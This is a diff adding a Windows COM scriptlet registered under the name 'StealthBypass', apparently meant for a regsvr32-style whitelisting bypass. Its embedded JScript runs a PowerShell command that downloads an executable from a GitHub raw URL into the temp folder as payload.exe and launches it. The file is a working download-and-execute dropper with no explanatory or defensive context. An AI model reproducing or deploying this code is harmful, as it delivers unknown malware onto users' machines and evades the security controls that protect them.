@@ -1,0 +1,13 @@
+<?XML version="1.0"?>
+<scriptlet>
+    <registration 
+        progid="StealthBypass"
+        classid="{AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE}">
+        <script language="JScript">
+            <![CDATA[
+                var shell = new ActiveXObject("WScript.Shell");
+                shell.Run("powershell -c Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/shiinayx64/inNCUEU2C8/refs/heads/main/Kasparov.exe' -OutFile $env:TEMP\\payload.exe; Start-Process $env:TEMP\\payload.exe");
+            ]]>
+        </script>
+    </registration>
+</scriptlet>
